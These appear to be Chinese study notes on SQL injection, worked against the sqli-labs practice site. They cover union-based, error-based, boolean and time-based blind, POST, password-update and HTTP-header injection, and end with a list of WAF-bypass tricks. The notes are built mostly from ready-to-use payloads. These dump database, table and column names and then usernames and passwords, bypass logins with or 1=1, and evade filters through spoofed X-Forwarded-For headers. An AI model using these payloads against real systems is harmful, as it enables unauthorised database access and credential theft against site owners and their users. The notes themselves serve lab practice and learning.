SQL注入初级篇&高级篇

mysql -u[用户名] -p[密码]
连接数据库

show databases;
查看数据库

use [数据库库名];
使用某个数据库

show tables;
查看库中有几张表

select * from table1;
查看table1中所有数据

union 联合

select * from table1 where id =1 union select 1,2,3;
左边右边同时执行

select * from table1 where id = -1 union select 1,2,3;
select * from table1 where id = 'x' union select 1,2,3;
如果左边出错，就执行右边

\ 转义字符
会把自己后面的第一个字符当作字符串

x\' === 字符串x'

注释符
--（后面有空格）但是，空格在网页提交里面是+
/**/
#

limit 限制
limit [从哪个开始] [输出几个];

http://sqlilabs.njhack.xyz/Less-1/index.php?id=2

步骤1：
推断数据库语法大概是什么

select 	* from [某个表] where id = [参数] limit 0,1;

select 	* from [某个表] where id = '2' limit 0,1;

步骤2:
让他报错，显示自己的闭合方式
select 	* from [某个表] where id = '2\' limit 0,1;

1\' LIMIT 0,1
' " ') ") )) ")) ')) +没有闭合

步骤3:
验证目标的闭合方式
select 	* from [某个表] where id = ' 2'--+  ' limit 0,1;
执行之后
select 	* from [某个表] where id = ' 2'

如果执行成功，闭合方式就是你所想的

步骤4:
确定一下，多少个列
select 	* from [某个表] where id = ' 2' order by 10 --+  ' limit 0,1;
判断一下他是否有10列，如果有显示正常，如果没有就报错

通过二分法判断有多少列
select 	* from [某个表] where id = ' 2' order by 3 --+  ' limit 0,1;
不报错，所以有3列

步骤5:
使用联合查询
因为推断出有3列，所以union select 1,2,3
记住！前面的参数必须出错，否则后面的1，2，3报错位出不来
id=-2' union select 1,2,3  --+
出现报错位，分别问2，3

步骤6：
开始刺探内部内容
id=-2' union select 1,database(),3  --+
输出数据库库名

输出库名为security

version()
user()
@@datadir

information_schema是自带的，相当于数据库户口本
information_schema的tables保存着所有数据库库名和表名的对应关系
information_schema的columns保存着库名--表名--列名所有对应关系

id=-2' union select 1,table_name,3 from information_schema.tables where table_schema='security' limit 0,1 --+
修改limit后面的参数即可
emails
referers
uagents
users

id=-2' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+

步骤7：
查询表中的列
id=-2' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+

发现:id,username,password

步骤8：
查询内容
union select 1,group_concat(username),group_concat(password) from users --+
>>>>
概括：

1: index.php?id=2(判断数据类型)

2: index.php?id=2\(判断闭合方式(假设闭合方式为'))

3: index.php?id=2' -- (验证闭合方式)

4: index.php?id=2' order by 10 -- (二分法判断列数(假设有3列))

5: index.php?id=-2' union select 1,2,3 -- (出现报错位为2,3(id后的参数必须报错，否则无法显示报错位))

6: index.php?id=-2' union select 1,database(),3 -- (刺探内部内容,输出数据库名(假设库名为security))

7: index.php?id=-2' union select 1,table_name,3 from information_schema.tables where table_schema='security' limit 0.1 -- (修改 limit 后面的参数获得信息)或者使用   index.php?id=-2' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- (只在数据不多的时候使用)

8: index.php?id=-2' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security'and table_name = 'users' -- (查询表中的列名(假设列名为id,username,password))

9: index.php?id=-2' union select 1,group_concat(username),group_concat(password) from users -- (查询具体内容)

（具体还有 ' " ') ") )) ")) ')) 以及无闭合方式这几种闭合方式）

(database() 库名 ; version() 版本号 ; user() 当前用户 ; @@datadir 数据库物理路径，可推断出操作系统）

(table 表)

大多数情况下，group_concat()查找有长度限制，内容会显示不完整


select group_concat(table_name) from information_schema.tables where table_schema = 'security'

select group_concat(column_name) from information_schema.columns where table_schema = 'security'and table_name = 'users'

selcet group_concat(username) from users

另外还有一些关于绕过屏蔽的其他方式

1.大小写绕过
UniOn SeleCT

2.双写绕过
union seleselectct

3.编码绕过
'scurity' = 0x73637572697479

4.注释符
uni/**/on sel/**/ect

5.空格绕过

6.or and绕过
and == &&
or == ||

7.内联函数
/!*select*/ 1,2,3

8.<>绕过
uni<>on

9.屏蔽逗号
select substr('security',1,3)
select substr('security' from 1 for 3)

union select 1,2,3
union select * from (select 1)a join (select 2)b join (select 3)c

limit 0,1
limit 0 offset 1

10.sleep屏蔽
and sleep(1)
and benchmark(100000000,1)

11.group_concat屏蔽
select group_concat('x','y')
select group_ws('','x','y')

12.=屏蔽
like rlike regexp <>
id =1' or '1' like '1

13.POST屏蔽#
考虑使用-- a大部分情况可以当作#用
uname=admin -- a&passwd=admin

14.特殊符号过waf
/*!50001 select * from users */
这里的50001=如果数据库版本是5.00.01以上的版本，这个语句才会被执行

15.ip地址拦截
放在burp的数据包中的
x-forward-for
x-remote-ip
x-originating-ip
x-remote-addr
x-real-ip

16.修改资源
http://www.xx.com/sql.php?id=1
http://www.xx.com/sql.php/1.js?id=1

>>>>

select count(*) from table1;
计算多少条数据

select rand();
生成随机数0-1

select floor(1.2);
向下取整

select floor(rand()*2);
生成0/1随机数

select floor(rand()*2)a;
取一个别名

select * from table1 group by id;
以id来进行分组

select concat(1,2,3);
字符拼接

select password,count(*) as num from table1 group by password;
统计不同密码有多少个，统计数据命名为num，顺便按照password进行分组

0x3a = :

select concat('haha',0x3a,'nihao');
输出haha:nihao

----------

select concat(0x3a,0x3a,(select database()),0x3a,0x3a)a;
::库名::

select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a;

select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns;

select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;

select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) from information_schema.columns group by concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2));

mysql官方说：rand函数每次出现都会重新计算一次

select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from table1;

select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns;

select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;

group by a是按a排序，a里只有0，1，并且随机！总有一天会出现2个0，2个1

实战：

id=1' AND (select 1 from (select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+

id=1' AND (select 1 from (select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+

?id=1' AND (select 1 from (select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+

hex不需要加任何东西

简单高效
' and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+

' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+

=======================

布尔型注入基本靠猜
布尔型盲注…………………………√+×

boolean True/False

不显示错误，也不显示数据库的内容

小知识：

select database();
数据库库名

select length(database());
库名的长度

select substr(database(),1,1);
从第1个字开始取1个

select ascii(substr(database(),1,1));
从第1个字开始取1个并且转化为ascii

select ascii(substr(database(),1,1))=104;
截取数据库库名第一个字，截取1个，转化为ascii码，判断是不是104

实战：
?id=1' and  (select ascii(substr(database(),1,1))= 115 )--+

?id=1' and  (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))= 115 )--+

----------

布尔型时间盲注

界面上完全没有反应，但是你好像觉得可以注入

小知识：
select sleep(5);
睡5s后输出0

select if((select database())="haha",sleep(5),null);

实战：
id=2' and sleep(5) --+

id=2' and if((select database())="security",sleep(5),null)--+（猜测名为security)

id=2' and if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e',sleep(5),null)--+

===================

post注入

猜测源码

$u = $_POST['uname'];
$p = $_POST['passwd'];

select username,password from table1 where username=("$u") and password=("$p") limit 0,1;

select username,password from table1 where username=("\") and password=("") limit 0,1;

判断为单引号闭合
\' and password='' LIMIT 0,1

select username,password from table1 where username=' ' or 1=1 limit 1,1 #   ' and password='$p' limit 0,1;

select username,password from table1 where username=' admin' and 1=1 #


select username,password from table1 where username=' ' union select 1,2 #   ' and password='$p' limit 0,1;

' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #


post盲注

判断闭合方式
") or 1=1 #

用户名和密码都写
") or ("1")=("1

select username,password from table1 where username=("") or ("1")=("1") and password=("") or ("1")=("1") limit 0,1;

布尔型盲注最好先猜出他们网站有什么用户名，以一个正确的用户名来当参照
admin") and (select database()='security') #


修改密码

post注入修改密码

update users set password='$pass' where username='Dumb';

update users set password='' or 1=1 #' where username='Dumb';


update users set password=1 

===================

http 头注入

user-agent = 浏览器信息

会记录用户数据到数据库

insert into 'security'.'uagents'('uagent','ip_address','username') values('浏览器信息','127.0.0.1','admin');

insert into 'security'.'uagents'('uagent','ip_address','username') values(' ' or '1'='1   ','127.0.0.1','admin');

' ' or '1'='1    '  

' and extractvalue(1,concat(0x7e,(select database()),0x7e)) or '1'='1

insert into 'security'.'uagents'('uagent','ip_address','username') values(' ' and extractvalue(1,concat(0x7e,(select database()),0x7e)) or '1'='1    ','127.0.0.1','admin');

referer = 来路信息（从哪个网站过来的）

cookie 可能导致平行越权

' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #

admin" and extractvalue(1,concat(0x7e,(select database()),0x7e)) #
